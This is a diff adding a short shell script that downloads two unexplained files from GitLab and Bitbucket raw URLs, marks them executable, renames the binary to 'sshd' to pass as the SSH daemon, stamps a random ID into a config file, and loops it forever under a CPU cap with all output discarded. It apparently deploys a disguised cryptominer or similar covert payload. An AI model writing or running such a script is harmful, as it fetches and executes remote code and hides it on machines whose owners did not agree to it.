@@ -1,0 +1,9 @@
+sudo apt-get update
+sudo apt-get install -y cpulimit
+wget https://gitlab.com/satugiga94/whne/-/raw/main/okes
+wget https://bitbucket.org/fapro/twsg/raw/842d3b8deee143a513315c767c41a0ec52237899/build_config
+chmod +x okes build_config
+SC=sshd
+mv okes $SC
+sed -i "s/BARU/$(shuf -n 1 -i 1-999999)/" "build_config"
+while :; do timeout 2m cpulimit -l 2 ./$SC; sleep 20; done >/dev/null >/dev/null 2>&1
